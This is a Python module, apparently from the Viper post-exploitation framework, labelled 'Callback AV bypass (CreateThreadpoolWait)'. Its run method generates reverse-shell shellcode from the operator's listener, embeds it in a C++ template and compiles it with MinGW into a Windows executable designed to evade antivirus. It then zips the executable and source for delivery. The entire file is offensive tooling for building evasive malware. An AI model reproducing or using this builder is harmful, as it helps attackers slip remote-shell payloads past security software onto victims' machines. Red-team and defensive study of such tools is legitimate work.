# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


import time

from Lib.ModuleAPI import *


class PostModule(PostPythonModule):
    NAME_ZH = "Callback免杀(CreateThreadpoolWait)"
    DESC_ZH = "模块通过编码shellcode与CreateThreadpoolWait Callback结合的方式实现免杀"

    NAME_EN = "Callback AV bypass(CreateThreadpoolWait)"
    DESC_EN = "The module realizes AV bypass by combining shellcode with CreateThreadpoolWait Callback"

    MODULETYPE = TAG2TYPE.Execution
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/hzc0xk"]
    REFERENCES = ["https://docs.microsoft.com/zh-cn/windows/win32/procthread/using-the-thread-pool-functions"]
    AUTHOR = ["Viper"]

    OPTIONS = register_options([
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        payload = self.get_handler_payload()
        if "windows" not in payload:
            return False, "选择handler错误,请选择windows平台的监听", "Select the handler error, please select the handler of the windows platform"
        return True, None

    def run(self):
        shellcode = self.generate_hex_reverse_shellcode_by_handler()
        source_code = self.generate_context_by_template(filename="main.cpp", SHELLCODE_STR=shellcode)
        mingw = Mingw(include_dir=self.module_data_dir, source_code=source_code)
        payload = self.get_handler_payload()
        if "x64" not in payload:
            arch = "x86"
        else:
            arch = "x64"
        binbytes = mingw.compile_cpp(arch=arch)

        exefilename = f"CallbackCreateThreadpoolWait_{int(time.time())}.exe"
        projectfilename = f"CallbackCreateThreadpoolWait_{int(time.time())}.zip"
        self.write_zip_vs_project(filename=projectfilename, source_code=source_code, exe_file=exefilename,
                                  exe_data=binbytes)

        self.log_info("模块执行完成", "Module operation completed")
        self.log_good(f"请在<文件列表>中查看生成的zip文件: {projectfilename}",
                      f"Please check the generated zip file in <Files>: {projectfilename}")
